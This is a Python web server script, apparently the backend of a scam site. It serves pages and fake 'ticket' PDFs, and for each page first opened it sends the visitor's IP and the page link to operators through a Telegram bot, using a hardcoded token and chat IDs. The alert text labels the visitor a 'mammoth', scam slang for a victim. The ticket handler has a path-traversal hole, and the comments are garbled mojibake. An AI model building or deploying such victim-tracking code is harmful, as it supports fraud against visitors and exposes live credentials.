#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞
PORT = 80  # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π HTTP –ø–æ—Ä—Ç
DIRECTORY = "."  # –ü–∞–ø–∫–∞ —Å —Å–∞–π—Ç–æ–º (–∫–æ—Ä—ñ–Ω—å –ø—Ä–æ–µ–∫—Ç—É)

def send_telegram_log(page, link, ip, country=""):
    BOT_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
    GROUP_ID = -4851128750  # –≤–∞—à group id
    ADMIN_ID = 7973971109   # –≤–∞—à admin id
    msg = (
        f"‚ö†Ô∏è –ú–∞–º–æ–Ω—Ç –æ—Ç–∫—Ä—ã–ª —Å—Ç—Ä–∞–Ω–∏—Ü—É\n"
        f"üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞: {page}\n"
        f"üîó –°—Å—ã–ª–∫–∞: {link}\n"
        f"üåç IP: {ip}\n"
        f"üåè –°—Ç—Ä–∞–Ω–∞: {country}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
    except Exception as e:
        print(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ª–æ–≥ —É Telegram: {e}")

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # –î–æ–±–∞–≤–ª—è–µ–º CORS –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def do_GET(self):
        print(f"GET: {self.path}")  # –õ–æ–≥—É–≤–∞–Ω–Ω—è –≤—Å—ñ—Ö GET-–∑–∞–ø–∏—Ç—ñ–≤
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # –Ø–∫—â–æ —Ñ–∞–π–ª –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ, –∞–ª–µ —î –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ ‚Äî –ø–æ–≤–µ—Ä—Ç–∞—î–º–æ index.html –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—ó –ø–∞–ø–∫–∏
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename="{filename}"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # –Ø–∫—â–æ —Ü–µ —Ä–µ—Å—É—Ä—Å ‚Äî –Ω–µ –ª–æ–≥—É–≤–∞—Ç–∏
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            return super().do_GET()
        # –ù–æ—Ä–º–∞–ª—ñ–∑—É—î–º–æ —à–ª—è—Ö –¥–ª—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ—Å—Ç—ñ
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # –õ–æ–≥—É–≤–∞—Ç–∏ —Ç—ñ–ª—å–∫–∏ —è–∫—â–æ —Ü–µ –æ—Å–Ω–æ–≤–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"üìù –õ–æ–≥—É—î–º–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=self.client_address[0]
                )
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")

    def do_POST(self):
        path = unquote(self.path.split('?', 1)[0])
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            import json
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = self.client_address[0]
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    try:
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"üåê –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω–∏–π –Ω–∞ –ø–æ—Ä—Ç—É {PORT}")
            print(f"üìÅ –û–±—Å–ª—É–≥–æ–≤—É—î–º–æ –ø–∞–ø–∫—É: {DIRECTORY}")
            print(f"üîó –°–∞–π—Ç –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"‚ùå –ü–æ–º–∏–ª–∫–∞: –ù–µ–º–∞—î –ø—Ä–∞–≤ –¥–ª—è –∑–∞–ø—É—Å–∫—É –Ω–∞ –ø–æ—Ä—Ç—É {PORT}")
        print("üí° –°–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –∑ –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –ø–æ—Ä—Ç 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"‚ùå –ü–æ–º–∏–ª–∫–∞: –ü–æ—Ä—Ç {PORT} –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è")
            print("üí° –ó—É–ø–∏–Ω—ñ—Ç—å —ñ–Ω—à–∏–π —Å–µ—Ä–≤–µ—Ä –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ —ñ–Ω—à–∏–π –ø–æ—Ä—Ç")
        else:
            print(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –∑–∞–ø—É—Å–∫—É —Å–µ—Ä–≤–µ—Ä–∞: {e}")
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è –°–µ—Ä–≤–µ—Ä –∑—É–ø–∏–Ω–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º")
    except Exception as e:
        print(f"‚ùå –ù–µ–æ—á—ñ–∫—É–≤–∞–Ω–∞ –ø–æ–º–∏–ª–∫–∞: {e}") 